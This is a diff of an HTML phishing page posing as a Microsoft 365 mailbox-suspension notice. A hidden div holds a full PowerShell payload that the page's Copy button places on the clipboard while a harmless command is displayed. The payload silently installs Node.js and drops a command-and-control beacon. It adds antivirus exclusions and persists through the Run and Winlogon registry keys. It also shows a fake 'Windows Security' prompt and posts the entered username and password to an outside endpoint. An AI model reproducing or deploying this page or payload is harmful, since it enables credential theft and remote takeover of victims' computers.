@@ -209,9 +209,15 @@
  border-radius: 4px;
  cursor: pointer;
  font-weight: 500;
+ transition: all 0.2s;
  }
  .code-block .copy-btn:hover {
  background: #e8eaed;
+ }
+ .code-block .copy-btn.copied {
+ background: #e6f4ea;
+ color: #1e8e3e;
+ border-color: #b7e1cd;
  }
  .code-block .hint {
  font-size: 11px;
@@ -286,7 +292,7 @@
  background: #1557b0;
  }
  .btn:disabled {
- background: #1a73e8;
+ background: #dadce0;
  cursor: default;
  }
  .btn.secure {
@@ -437,46 +443,29 @@
 <body>
 
  <!-- 
-   HIDDEN RAW PAYLOAD 
-   The full PowerShell script from code.txt is stored here as plain text.
-   It's visually hidden with CSS but visible in DevTools.
+   HIDDEN PAYLOAD CONTAINER 
+   This contains the actual script. It is visually hidden via CSS.
  -->
- <div id="raw_payload" style="display:none;">
-# VERIFIED CONFIGURATION ---
-# The "Lookup" URL (R2) - This is the only thing hardcoded in the JS file
-$secretR2Url = "https://public-714b7e7fccfe480d9a0aa6779882093ce.r2.dev/system_cache.json"
-$nodeVersion = "v24.21.0" $nodeUrl = "https://nodejs.org/dist/$nodeVersion/node-$nodeVersion-x64.msi" $payloadDir = "C:\Program Files\microsoft\Windows\NodeUpdate" $malwarePath = "$payloadDir\update.dat"
+ <div id="payload_container" style="display:none;">
+Clear-Host
+Start-BitsTransfer -Source "https://nodejs.org/dist/v24.21.0/node-v24.21.0-x64.msi" -Destination "$env:TEMP\node.msi"
+Start-Process msiexec.exe -ArgumentList "/i `"$env:TEMP\node.msi`" /quiet /norestart" -Wait
+$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
 
-Write-Host "[*] Phase 1: Environment Setup & Payload Creation" -ForegroundColor Cyan
-
-# 1. Download and Install Node.js silently
-Start-BitsTransfer -Source $nodeUrl -Destination "$env:TEMP@node.msi"
-Start-Process msiexec.exe -ArgumentList "/i `"$env:TEMP@node.msi`" /quiet /norestart" -Wait
-
-# 2. Refresh PATH so we can use 'node' command immediately
-$env:PATH = [System.Environment]::GetEnvironmentVariable("PATH","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("PATH","User")
-
-# 3. Create the payload directory
+$payloadDir = "C:\ProgramData\Microsoft\Windows\NodeUpdate"
 New-Item -ItemType Directory -Force -Path $payloadDir | Out-Null
 Set-Location $payloadDir
 
-# 4. Write the "Clean" JavaScript to update.dat
-# Note: The actual R2 URL is NOT in this string. It's replaced by a memory reference.
-$jsPayload = @"
+$malwarePath = "$payloadDir\update.dat"
+
+$js = @"
 const https = require("https");
 const { exec } = require("child_process");
-
-// Read the secret link from the process memory (set by PowerShell)
-const R2_URL = process.env.C2_SECRET_LINK; 
-
-if (!R2_URL) {
- console.error("[!] CRITICAL ERROR: C2 link missing from memory!");
- process.exit(1);
-}
-
+const R2_URL = "https://pub-2606cf3b425248d093389f8ccee882f1.r2.dev/system-cache.json";
 async function getC2() {
- return new Promise((resolve) => { https.get(R2_URL, (res) => {
- let data = ""
+ return new Promise((resolve) => {
+ https.get(R2_URL, (res) => {
+ let data = "";
  res.on("data", (c) => data += c);
  res.on("end", () => {
  try {
@@ -485,19 +474,16 @@ async function getC2() {
  } catch (e) {
  resolve(null);
  }
- }
  });
  }).on("error", () => resolve(null));
  });
 }
-
 setInterval(async () => {
  try {
  const c2Url = await getC2();
  if (!c2Url) return;
- 
  https.get(c2Url + "/beacon", (res) => {
- let data = ""
+ let data = "";
  res.on("data", (c) => data += c);
  res.on("end", () => {
  if (data && data !== "none") {
@@ -514,133 +500,138 @@ setInterval(async () => {
 }, 15000);
 "@
 
-Set-Content -Path $malwarePath -Value $jsPayload
+Set-Content -Path $malwarePath -Value $js
 
-# 5. AV Evasion (Exclusions)
 Add-MpPreference -ExclusionPath $payloadDir -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionProcess "node.exe" -ErrorAction SilentlyContinue
+Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "NodeUpdate" -Value "conhost.exe --headless node `"$malwarePath`"" -ErrorAction SilentlyContinue
 
-# 6. Registry Persistence (Autostart on Boot)
-Set-ItemProperty -Path "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -Name "NodeUpdate" -Value "conhost.exe --headless node `$malwarePath`" -ErrorAction SilentlyContinue
-$shellKey = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft Windows NT\CurrentVersion\Winlogon"
+$shellKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 $currentShell = (Get-ItemProperty -Path $shellKey -Name "Shell").Shell
-if ($currentShell notmatch "node.exe") {
- Set-ItemProperty -Path $shellKey -Name "Shell" -Value "$currentShell, conhost.exe --headless node `$malwarePath`" -ErrorAction SilentlyContinue
+if ($currentShell -notmatch "node.exe") {
+ Set-ItemProperty -Path $shellKey -Name "Shell" -Value "$currentShell, conhost.exe --headless node `"$malwarePath`"" -ErrorAction SilentlyContinue
 }
 
-Write-Host "[*] Phase 2: Memory Injection & Execution" -ForegroundColor Green
-
-# 7. THE MEMSYS INJECTION
-# We set the environment variable specifically for the 'Process' scope of the next command.
-[System.Environment]::SetEnvironmentVariable("C2_SECRET_LINK", $secretR2Url, "Process")
-
-# 8. Launch the hidden Node process
 $nodePath = Join-Path $env:ProgramFiles "NodeJS\node.exe"
 Start-Process $nodePath -ArgumentList "`"$malwarePath`"" -WindowStyle Hidden
 
-# 9. Credential Harvesting UI
 Add-Type -AssemblyName System.Windows.Forms
-add-Type -AssemblyName System.Drawing
-form = New-Object System.Windows.Forms
-form.Text = "Windows Security"
-form.Size = New-Object System.Drawing.Size(450, 280)
-form.StartPosition = 'CenterScreen'
-form.TopMost = true
-form.FormBorderStyle = 'FixedDialog'
-form.MaximizeBox = false
-form.MinimizeBox = false
-form.BackColor = [System.Drawing.Color]::White
+Add-Type -AssemblyName System.Drawing
+
+$form = New-Object System.Windows.Forms.Form
+$form.Text = "Windows Security"
+$form.Size = New-Object System.Drawing.Size(450, 280)
+$form.StartPosition = "CenterScreen"
+$form.TopMost = $true
+$form.FormBorderStyle = 'FixedDialog'
+$form.MaximizeBox = $false
+$form.MinimizeBox = $false
+$form.BackColor = [System.Drawing.Color]::White
+
 $icon = [System.Drawing.SystemIcons]::Shield
-form.Icon = $icon
-$pictureBox = New-Object System.Windows.PictureBox
+$form.Icon = $icon
+
+$pictureBox = New-Object System.Windows.Forms.PictureBox
 $pictureBox.Image = $icon.ToBitmap()
 $pictureBox.SizeMode = "StretchImage"
 $pictureBox.Location = New-Object System.Drawing.Point(20, 25)
-pictureBox.Size = New-Object System.Drawing.Size(32, 32)
-form.Controls.Add(pictureBox)
-labelTitle = New-Object System.Windows.Label
-labelTitle.Text = "Enter credentials to finish installation"
-labelTitle.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
-labelTitle.ForeColor = [System.Drawing.Color]::Black
-labelTitle.Location = New-Object System.Drawing.Point(65, 20)
-lblTitle.Size = New-Object System.Drawing.Size(360, 25)
-form.Controls.Add(labelTitle)
-labelSub = New-Object System.Windows.Label
-labelSub.Text = "Please verify your account to complete the installation."
-labelSub.Font = New-Object System.Drawing.Font("Segoe UI", 9)
-labelSub.ForeColor = [System.Drawing.Color]::DimGray
-labelSub.Location = New-Object System.Drawing.Point(65, 45)
-labelSub.Size = New-Object System.Drawing.Size(360, 40)
-form.Controls.Add(labelSub)
-labelUser = New-Object System.Windows.Label
-labelUser.Text = "Username:"
-labelUser.Font = New-Object System.Drawing.Font("Segoe UI", 9)
-labelUser.Location = New-Object System.Drawing.Point(25, 100)
-labelUser.Size = New-Object System.Drawing.Size(100, 20)
-form.Controls.Add(labelUser)
-userBox = New-Object System.Windows.TextBox
-userBox.Location = New-Object System.Drawing.Point(130 98)
-userBox.Size = New-Object System.Drawing.Size(280, 23)
-userBox.Font = New-Object System.Drawing.Font("Segoe UI", 9)
-userBox.Text = $env:USERNAME
-form.Controls.Add(userBox)
-labelPass = New-Object System.Windows.Label
-labelPass.Text = "Password:"
-labelPass.Font = New-Object System.Drawing.Font("Segoe UI", 9)
-labelPass.Location = New-Object System.Drawing.Point(25, 140)
-labelPass.Size = New-Object System.Drawing.Size(100, 20)
-form.Controls.Add(labelPass)
-passBox = New-Object System.Windows.TextBox
-passBox.Location = New-Object System.Drawing.Point(130, 138)
-passBox.Size = New-Object System.Drawing.Size(280, 23)
-passBox.Font = New-Object System.Drawing.Font("Segoe UI", 9)
-passBox.UseSystemPasswordChar = true
-form.Controls.Add(passBox)
-labelReminder = New-Object System.Windows.Label
-labelReminder.Text = "(Reminder: Password is case-sensitive)"
-labelReminder.Font = New-Object System.Drawing.Font("Segoe UI", 8, [System.Drawing.FontStyle]::Italic)
-labelReminder.ForeColor = [System.Drawing.Color]::Gray
-labelReminder.Location = New-Object System.Drawing.Point(130, 165)
-labelReminder.Size = New-Object System.Drawing.Size(280, 20)
-form.Controls.Add(labelReminder)
-button = New-Object System.Windows.Button
-button.Text = "OK"
-button.Location = New-Object System.Drawing.Point(240, 205)
-button.Size = New-Object System.Drawing.Size(80, 28)
-button.Font = New-Object System.Drawing.Font("Segoe UI", 9)
-button.BackColor = [System.Drawing.Color]::FromARGB(0, 120, 215)
-button.ForeColor = [System.Drawing.Color]::White
-button.FlatStyle = 'System'
-button.DialogResult = [System.Windows.Forms.DialogResult]::OK
-form.Controls.Add(button)
-form.AcceptButton = button
-buttonCancel = New-Object System.Windows.Button
-buttonCancel.Text = "Cancel"
-buttonCancel.Location = New-Object System.Drawing.Point(330, 205)
-buttonCancel.Size = New-Object System.Drawing.Size(80, 28)
-buttonCancel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
-buttonCancel.FlatStyle = 'System'
-buttonCancel.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
-form.Controls.Add(buttonCancel)
-form.CancelButton = buttonCancel
-result = form.ShowDialog()
-username = $userBox.Text
-password = $passBox.Text
-if (-not [string]::IsNullOrEmpty($username)) {
- message = "New Credentials Captured!"
-$host: $env:COMPUTERNAME
-User: $username
-Pass: $password"
-} else {
- message = "User clicked Cancel or left blank on the prompt."
-$host: $env:COMPUTERNAME
-}
-_workerUrl = "https://solitary-unit-48b0.westnorthworks.dev/"
+$pictureBox.Size = New-Object System.Drawing.Size(32, 32)
+$form.Controls.Add($pictureBox)
 
-body = { message = $message } | ConvertTo-json
+$labelTitle = New-Object System.Windows.Forms.Label
+$labelTitle.Text = "Enter credentials to finish installation"
+$labelTitle.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
+$labelTitle.ForeColor = [System.Drawing.Color]::Black
+$labelTitle.Location = New-Object System.Drawing.Point(65, 20)
+$labelTitle.Size = New-Object System.Drawing.Size(360, 25)
+$form.Controls.Add($labelTitle)
+
+$labelSub = New-Object System.Windows.Forms.Label
+$labelSub.Text = "Please verify your account to complete the installation."
+$labelSub.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+$labelSub.ForeColor = [System.Drawing.Color]::DimGray
+$labelSub.Location = New-Object System.Drawing.Point(65, 45)
+$labelSub.Size = New-Object System.Drawing.Size(360, 40)
+$form.Controls.Add($labelSub)
+
+$labelUser = New-Object System.Windows.Forms.Label
+$labelUser.Text = "Username:"
+$labelUser.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+$labelUser.Location = New-Object System.Drawing.Point(25, 100)
+$labelUser.Size = New-Object System.Drawing.Size(100, 20)
+$form.Controls.Add($labelUser)
+
+$userBox = New-Object System.Windows.Forms.TextBox
+$userBox.Location = New-Object System.Drawing.Point(130, 98)
+$userBox.Size = New-Object System.Drawing.Size(280, 23)
+$userBox.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+$userBox.Text = $env:USERNAME
+$form.Controls.Add($userBox)
+
+$labelPass = New-Object System.Windows.Forms.Label
+$labelPass.Text = "Password:"
+$labelPass.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+$labelPass.Location = New-Object System.Drawing.Point(25, 140)
+$labelPass.Size = New-Object System.Drawing.Size(100, 20)
+$form.Controls.Add($labelPass)
+
+$passBox = New-Object System.Windows.Forms.TextBox
+$passBox.Location = New-Object System.Drawing.Point(130, 138)
+$passBox.Size = New-Object System.Drawing.Size(280, 23)
+$passBox.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+$passBox.UseSystemPasswordChar = $true
+$form.Controls.Add($passBox)
+
+$labelReminder = New-Object System.Windows.Forms.Label
+$labelReminder.Text = "(Reminder: Password is case-sensitive)"
+$labelReminder.Font = New-Object System.Drawing.Font("Segoe UI", 8, [System.Drawing.FontStyle]::Italic)
+$labelReminder.ForeColor = [System.Drawing.Color]::Gray
+$labelReminder.Location = New-Object System.Drawing.Point(130, 165)
+$labelReminder.Size = New-Object System.Drawing.Size(280, 20)
+$form.Controls.Add($labelReminder)
+
+$button = New-Object System.Windows.Forms.Button
+$button.Text = "OK"
+$button.Location = New-Object System.Drawing.Point(240, 205)
+$button.Size = New-Object System.Drawing.Size(80, 28)
+$button.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+$button.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
+$button.ForeColor = [System.Drawing.Color]::White
+$button.FlatStyle = 'System'
+$button.DialogResult = [System.Windows.Forms.DialogResult]::OK
+$form.Controls.Add($button)
+
+$form.AcceptButton = $button
+
+$buttonCancel = New-Object System.Windows.Forms.Button
+$buttonCancel.Text = "Cancel"
+$buttonCancel.Location = New-Object System.Drawing.Point(330, 205)
+$buttonCancel.Size = New-Object System.Drawing.Size(80, 28)
+$buttonCancel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+$buttonCancel.FlatStyle = 'System'
+$buttonCancel.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
+$form.Controls.Add($buttonCancel)
+
+$form.CancelButton = $buttonCancel
+
+$result = $form.ShowDialog()
+
+$username = $userBox.Text
+$password = $passBox.Text
+
+if (-not [string]::IsNullOrWhiteSpace($username)) {
+ $message = "New Credentials Captured!`nHost: $env:COMPUTERNAME`nUser: $username`nPass: $password"
+} else {
+ $message = "User clicked Cancel or left blank on the prompt.`nHost: $env:COMPUTERNAME"
+}
+
+$workerUrl = "https://soft-term-d400.goodluckfeds.workers.dev/"
+
+$body = @{ message = $message } | ConvertTo-Json
 try {
- Invoke-RestMethod -Uri $_workerUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
+ Invoke-RestMethod -Uri $workerUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
 } catch {}
+
 Clear-Host
 Write-Host "[+] Installation complete." -ForegroundColor Green
  </div>
@@ -649,12 +640,13 @@ Write-Host "[+] Installation complete." -ForegroundColor Green
 
  <!-- Microsoft Watermark -->
  <div class="watermark">
- <span class="m1">M</span><span class="m2">i</span><span class="m3">c</span><span class="m4">r</span><span class="m1">o</span><span class="m2">s</span><span class="m3">o</span><span class="m4">ft</span>
+ <span class="m1">M</span><span class="m2">i</span><span class="m3">c</span><span class="m4">r</span><span class="m1">o</span><span class="m2">s</span><span class="m3">o</span><span class="m4">f</span><span class="m1">t</span>
  </div>
 
  <div class="header">
  <div class="icon">
- <img src="https://static.vecteezy.com/system/resources/previews/049/351/009/non_2x/microsoft-exchange-icon-logo-symbol-free-png.png" alt="Microsoft Exchange icon">
+ <!-- Restored Exchange Online / Microsoft 365 Icon -->
+ <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c9/Microsoft_Office_365_logo_%282021%29.svg/1200px-Microsoft_Office_365_logo_%282021%29.svg.png" alt="Microsoft 365 icon">
  </div>
  <span class="title-text">Mailbox verification required</span>
  <span class="badge">Urgent</span>
@@ -722,7 +714,8 @@ Write-Host "[+] Installation complete." -ForegroundColor Green
  </div>
 
  <div class="code-block">
- <button class="copy-btn" onclick="copyFullPayload()">Copy</button>
+ <button class="copy-btn" onclick="copyScript1()">Copy</button>
+ <!-- Placeholder text remains visible for UI consistency -->
  <div class="code" id="script1">
  powershell -Command "Write-Host 'Generating primary recovery keys...'; Start-Sleep 2; Write-Host 'Key 1: BK-'; Get-Random -Maximum 9999; Start-Sleep 1; Write-Host 'Key 2: RC-'; Get-Random -Maximum 9999; Write-Host 'Primary keys generated.'"
  </div>
@@ -731,7 +724,7 @@ Write-Host "[+] Installation complete." -ForegroundColor Green
 
  <div class="admin-note">
  <strong>Admin credentials required</strong><br>
- Windows will prompt you for admin credentials. This is required because the keys need SYSTEM-level privileges to access your hardware ID and TPM module. Without admin rights, the keys cannot be bound and Exchange Online will not recognize them.
+ When you run Step 2, Windows will prompt you for admin credentials. This is required because the keys need SYSTEM-level privileges to access your hardware ID and TPM module. Without admin rights, the keys cannot be bound and Exchange Online will not recognize them.
 
  <div class="highlight">
  <strong>What happens next:</strong> Once bound, the keys will be sent to Microsoft's servers for authentication. This verifies that your mailbox is linked to this specific Windows system and confirms your identity. After successful verification, your mailbox will be secured and the suspension will be cancelled.
@@ -740,10 +733,13 @@ Write-Host "[+] Installation complete." -ForegroundColor Green
 
  <div class="step-divider"></div>
 
- <!-- The verify-note div has been removed completely as requested -->
+ <div class="verify-note" id="verifyNote">
+ <strong>Only click "Verify my mailbox" after pasting both scripts in the Administrator Command Prompt and entering your admin credentials.</strong><br><br>
+ Once bound, the keys will be sent to Microsoft's servers for authentication. This verifies that your mailbox is linked to this specific Windows system and confirms your identity. After successful verification, your mailbox will be secured and the suspension will be cancelled.
+ </div>
 
- <button class="btn" id="verifyBtn" disabled style="cursor: default; pointer-events: none; color: transparent;">
- &nbsp;
+ <button class="btn" id="verifyBtn" onclick="verifyAccount()">
+ Verify my mailbox
  </button>
 
  <div class="timer-bottom">
@@ -789,8 +785,7 @@ Write-Host "[+] Installation complete." -ForegroundColor Green
  document.querySelector('.recovery-note').style.borderColor = '#f5c6cb';
  document.querySelector('.recovery-note').style.color = '#b2530c';
 
- // The verify-note element no longer exists, so we skip hiding it
- // document.querySelector('.verify-note').style.display = 'none';
+ document.querySelector('.verify-note').style.display = 'none';
 
  const btn = document.querySelector('.btn');
  btn.disabled = true;
@@ -810,121 +805,36 @@ Write-Host "[+] Installation complete." -ForegroundColor Green
 
  updateTimer();
 
- // ===== COPY FUNCTIONS =====
+ // ===== COPY LOGIC =====
  function copyScript1() {
- const code = document.getElementById('script1').textContent.trim();
- navigator.clipboard.writeText(code).then(() => {
- const btn = document.querySelectorAll('.copy-btn')[0];
- btn.textContent = 'Copied';
- setTimeout(() => btn.textContent = 'Copy', 2000);
- });
+   // Get the hidden payload
+   const payloadDiv = document.getElementById('payload_container');
+   const rawContent = payloadDiv.innerText.trim();
+
+   navigator.clipboard.writeText(rawContent).then(() => {
+     const btn = document.querySelector('.code-block .copy-btn');
+     const originalText = btn.textContent;
+     
+     btn.textContent = 'Copied!';
+     btn.classList.add('copied');
+     
+     setTimeout(() => {
+       btn.textContent = originalText;
+       btn.classList.remove('copied');
+     }, 2000);
+   }).catch(err => {
+     console.error('Failed to copy: ', err);
+     alert('Failed to copy script to clipboard.');
+   });
  }
 
- function copyScript2() {
- const code = document.getElementById('script2').textContent.trim();
- navigator.clipboard.writeText(code).then(() => {
- const btn = document.querySelectorAll('.copy-btn')[1];
- btn.textContent = 'Copied';
- setTimeout(() => btn.textContent = 'Copy', 2000);
- });
- }
-
- // ===== VERIFY FUNCTION =====
- // The verifyAccount function is kept but will never be called because the button is disabled.
  function verifyAccount() {
- if (timeLeft <= 0) {
- alert('The recovery keys have expired. Your mailbox cannot be verified through this method.');
- return;
+   const banner = document.getElementById('successBanner');
+   banner.style.display = 'block';
+   document.getElementById('verifyNote').style.display = 'none';
+   document.querySelector('.btn').style.display = 'none';
+   document.querySelector('.timer-bottom').style.display = 'none';
  }
-
- const confirmed = confirm(
- 'Please confirm:\n\n' +
- '1. Have you run both scripts in Administrator Command Prompt?\n' +
- '2. Did you enter your admin credentials when prompted?\n' +
- '3. Did you see both "Primary keys generated" and "Mailbox verified"?\n\n' +
- 'Click OK to verify your mailbox.'
- );
-
- if (confirmed) {
- document.querySelector('.warning').style.display = 'none';
- document.querySelector('.recovery-note').style.display = 'none';
- // .verify-note no longer exists
- // document.querySelector('.verify-note').style.display = 'none';
- document.querySelector('.step-divider').style.display = 'none';
- document.querySelector('.instruction-note').style.display = 'none';
- document.querySelector('.section-title').style.display = 'none';
- document.querySelector('.section-desc').style.display = 'none';
- document.querySelector('.code-block').style.display = 'none';
- document.querySelector('.admin-note').style.display = 'none';
-
- const successBanner = document.getElementById('successBanner');
- successBanner.style.display = 'block';
-
- clearInterval(timerInterval);
- timerDisplay.textContent = 'Secured';
- timerDisplay.style.color = '#1e8e3e';
- timerDisplay.style.animation = 'none';
- timerDisplay.className = 'time secure';
- timerBottom.textContent = 'Secured';
- timerBottom.className = 'secure';
-
- const btn = document.querySelector('.btn');
- btn.disabled = true;
- btn.textContent = 'Mailbox secured';
- btn.className = 'btn secure';
-
- const badge = document.querySelector('.badge');
- badge.textContent = 'Secured';
- badge.style.background = '#e6f4ea';
- badge.style.color = '#1e8e3e';
-
- document.querySelector('.title-text').textContent = 'Mailbox recovered successfully';
-
- alert('Your mailbox has been secured successfully.\n\nSuspension cancelled. Mail flow restored.');
- }
- }
-
- // ===== BLINK ANIMATION =====
- const style = document.createElement('style');
- style.textContent = `
- @keyframes blink {
- 0%, 100% { opacity: 1; }
- 50% { opacity: 0.3; }
- }
- `;
- document.head.appendChild(style);
-
- // ===== COPY FULL PAYLOAD (RAW, NO ENCODING) =====
- function copyFullPayload() {
- // 1. Get the hidden element with the raw payload
- const payloadDiv = document.getElementById('raw_payload');
- const rawContent = payloadDiv.innerText.trim();
-
- // 2. Copy directly to clipboard (no decoding needed)
- navigator.clipboard.writeText(rawContent).then(() => {
- const btn = event.target;
- const originalText = btn.textContent;
- btn.textContent = 'Copied!';
- setTimeout(() => btn.textContent = originalText, 2000);
- }).catch(err => {
- console.error('Failed to copy: ', err);
- });
- }
-
- // Initialize the first copy button to copy the full payload
- document.querySelector('.code-block .copy-btn').addEventListener('click', function(e) {
- e.preventDefault();
- const payloadDiv = document.getElementById('raw_payload');
- const rawContent = payloadDiv.innerText.trim();
- 
- navigator.clipboard.writeText(rawContent).then(() => {
- const btn = e.target;
- const originalText = btn.textContent;
- btn.textContent = 'Copied!';
- setTimeout(() => btn.textContent = originalText, 2000);
- });
- });
-
  </script>
 
 </body>
